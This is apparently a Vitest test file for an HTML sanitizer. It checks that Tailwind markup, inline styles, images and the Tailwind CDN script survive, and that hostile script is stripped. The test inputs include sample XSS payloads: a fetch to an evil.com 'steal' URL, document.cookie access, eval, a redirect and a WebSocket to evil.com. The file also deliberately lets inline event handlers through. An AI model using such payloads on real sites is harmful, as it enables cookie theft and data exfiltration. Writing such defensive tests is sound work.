import { describe, it, expect } from 'vitest';
import { sanitizeHTML } from '../sanitizer';

describe('sanitizeHTML', () => {
  it('should allow basic HTML with TailwindCSS class names', () => {
    const input = '<div class="flex items-center justify-between p-4 bg-blue-500 text-white rounded-lg"><h1 class="text-2xl font-bold">Hello</h1></div>';
    const result = sanitizeHTML(input);
    expect(result).toBe(input);
  });

  it('should allow inline style attributes', () => {
    const input = '<div style="color: red; background: linear-gradient(to right, #000, #fff);">Styled</div>';
    const result = sanitizeHTML(input);
    expect(result).toBe(input);
  });

  it('should strip external script tags with non-whitelisted src', () => {
    const input = '<script src="https://evil.com/hack.js"></script><p>Safe content</p>';
    const result = sanitizeHTML(input);
    expect(result).not.toContain('evil.com');
    expect(result).not.toContain('<script src="https://evil.com/hack.js">');
    expect(result).toContain('<p>Safe content</p>');
  });

  it('should allow inline onclick and simple interaction events', () => {
    const input = `<button onclick="alert('hello')" onmouseover="this.style.color='red'">Click me</button>`;
    const result = sanitizeHTML(input);
    expect(result).toBe(input);
  });

  it('should strip fetch calls inside inline script', () => {
    const input = '<script>fetch("https://evil.com/steal")</script>';
    const result = sanitizeHTML(input);
    expect(result).not.toContain('fetch(');
  });

  it('should strip eval()', () => {
    const input = '<script>eval("alert(1)")</script>';
    const result = sanitizeHTML(input);
    expect(result).not.toContain('eval(');
  });

  it('should strip document.cookie access', () => {
    const input = '<script>var x = document.cookie;</script>';
    const result = sanitizeHTML(input);
    expect(result).not.toContain('document.cookie');
  });

  it('should strip window.location manipulation', () => {
    const input = '<script>window.location = "https://evil.com";</script>';
    const result = sanitizeHTML(input);
    expect(result).not.toContain('window.location');
  });

  it('should allow TailwindCSS CDN script tag', () => {
    const input = '<script src="https://cdn.tailwindcss.com"></script><div class="p-4">Content</div>';
    const result = sanitizeHTML(input);
    expect(result).toContain('<script src="https://cdn.tailwindcss.com"></script>');
    expect(result).toContain('<div class="p-4">Content</div>');
  });

  it('should allow img tags', () => {
    const input = '<img src="https://example.com/photo.jpg" alt="A photo" class="w-full rounded-md" />';
    const result = sanitizeHTML(input);
    expect(result).toBe(input);
  });

  it('should strip WebSocket usage inside inline script', () => {
    const input = '<script>const ws = new WebSocket("wss://evil.com/ws");</script>';
    const result = sanitizeHTML(input);
    expect(result).not.toContain('WebSocket');
  });
});
